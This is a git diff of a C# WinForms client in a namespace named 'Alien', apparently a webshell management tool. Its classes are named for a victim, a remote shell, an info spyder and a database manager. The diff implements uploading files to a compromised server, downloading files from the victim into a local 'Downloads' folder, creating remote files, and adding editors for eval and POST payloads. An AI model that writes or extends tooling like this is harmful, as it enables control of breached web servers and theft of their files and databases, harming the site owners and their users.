@@ -1,4 +1,5 @@
-﻿using System;
+﻿using ICSharpCode.TextEditor;
+using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
@@ -16,12 +17,15 @@ namespace Alien
         private clsWeb m_web { get; set; }
         private clsVictim m_victim { get { return m_web.m_victim; } }
 
-        private clsInfoSpyder m_infoSpyder { get; set; }
-        private clsfnFileMgr m_fileMgr { get; set; }
-        private clsfnShell m_rShell { get; set; }
-        private clsfnDb m_dbMgr { get; set; }
+        public clsInfoSpyder m_infoSpyder { get; set; }
+        public clsfnFileMgr m_fileMgr { get; set; }
+        public clsfnShell m_rShell { get; set; }
+        public clsfnDb m_dbMgr { get; set; }
 
         private WebBrowser m_ctrlInfoBrowser = new WebBrowser();
+        private WebBrowser m_ctrlEvalBrowser = new WebBrowser();
+        private TextEditorControlEx m_ctrlEvalEditor = new TextEditorControlEx();
+        private TextEditorControlEx m_ctrlPostEditor = new TextEditorControlEx();
 
         private string[] m_asImageExt =
         {
@@ -286,14 +290,41 @@ namespace Alien
             treeView3.SelectedNode = node;
         }
 
-        public async void fnFileUpload()
+        public async Task<Dictionary<string, bool>> fnFileUpload(List<string> lsSrcFilePath)
         {
+            string szCurrentDir = m_fileMgr.m_szCurrentPath;
+            Dictionary<string, bool> dicState = new Dictionary<string, bool>();
 
+            foreach (string szSrcFilePath in lsSrcFilePath)
+            {
+                string szFileName = Path.GetFileName(szSrcFilePath);
+                string szDstFilePath = Path.Combine(szCurrentDir, szFileName);
+
+                bool bRet = await m_fileMgr.fnbFileUpload(szSrcFilePath, szDstFilePath);
+                dicState[szFileName] = bRet;
+            }
+
+            return dicState;
         }
 
-        public async void fnFileDownload()
+        public async Task<Dictionary<string, bool>> fnFileDownload(List<string> lsRemoteFilePath)
         {
+            string szLocalSaveDirPath = Path.Combine(m_victim.m_szShellDomain, "Downloads");
+            if (!Directory.Exists(szLocalSaveDirPath))
+                Directory.CreateDirectory(szLocalSaveDirPath);
 
+            Dictionary<string, bool> dicState = new Dictionary<string, bool>();
+
+            foreach (string szRemoteFilePath in lsRemoteFilePath)
+            {
+                string szFileName = Path.GetFileName(szRemoteFilePath);
+                string szLocalFilePath = Path.Combine(szLocalSaveDirPath, szFileName);
+
+                bool bRet = await m_fileMgr.fnbFileDownload(szRemoteFilePath, szLocalFilePath);
+                dicState[szRemoteFilePath] = bRet;
+            }
+
+            return dicState;
         }
 
         public async void fnFileNewFolder()
@@ -301,9 +332,21 @@ namespace Alien
 
         }
 
-        public async void fnFileNewFile()
+        public void fnFileNewFile()
         {
+            frmTextEditor f = fnFindForm<frmTextEditor>();
+            if (null == f)
+            {
+                f = new frmTextEditor();
+                f.Owner = this;
+                f.Show();
+            }
 
+            f.BringToFront();
+
+            string szFileName = clsTool.fnszGenerateFileNameWithDateTime("txt");
+            string szFilePath = Path.Combine(m_fileMgr.m_szCurrentPath, szFileName).Replace("\\", "/");
+            f.fnShowContent(szFilePath, string.Empty);
         }
 
         #endregion
@@ -342,9 +385,19 @@ namespace Alien
         #endregion
         #region Database
 
-        async void fnDbInit()
+        void fnDbInit()
         {
+            //Load database from *.sqlite file.
+            treeView2.Nodes.Clear();
 
+            var ls = m_dbMgr.fnGetAllDbConfig();
+            foreach (var db in ls)
+            {
+                TreeNode node = new TreeNode(db.szSource);
+                node.Tag = db;
+
+                treeView2.Nodes.Add(node);
+            }
         }
 
         async void fnGetTable()
@@ -357,8 +410,14 @@ namespace Alien
 
         }
 
+        void fnAddNewDbConfig()
+        {
+
+        }
+
         #endregion
         #region Run Code
+
 
 
         #endregion
@@ -373,6 +432,16 @@ namespace Alien
             tabPage1.Controls.Add(m_ctrlInfoBrowser);
             m_ctrlInfoBrowser.Dock = DockStyle.Fill;
             m_ctrlInfoBrowser.BringToFront();
+
+            splitContainer4.Panel1.Controls.Add(m_ctrlEvalBrowser);
+            tabControl5.TabPages[0].Controls.Add(m_ctrlEvalEditor);
+            tabControl5.TabPages[1].Controls.Add(m_ctrlPostEditor);
+            m_ctrlEvalBrowser.Dock = DockStyle.Fill;
+            m_ctrlEvalEditor.Dock = DockStyle.Fill;
+            m_ctrlPostEditor.Dock = DockStyle.Fill;
+            m_ctrlEvalBrowser.BringToFront();
+            m_ctrlEvalEditor.BringToFront();
+            m_ctrlPostEditor.BringToFront();
 
             if (await fnbValidator())
             {
@@ -575,7 +644,31 @@ namespace Alien
         //File.NewFile
         private void toolStripMenuItem16_Click(object sender, EventArgs e)
         {
+            fnFileNewFile();
+        }
 
+        //File.NewFile
+        private void toolStripMenuItem13_Click(object sender, EventArgs e)
+        {
+            fnFileNewFile();
+        }
+
+        private void toolStripMenuItem11_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        //File.NewFolder
+        private void toolStripMenuItem12_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void toolStripButton4_Click(object sender, EventArgs e)
+        {
+            frmDbEdit f = new frmDbEdit(m_dbMgr, this);
+
+            f.ShowDialog();
         }
     }
 }
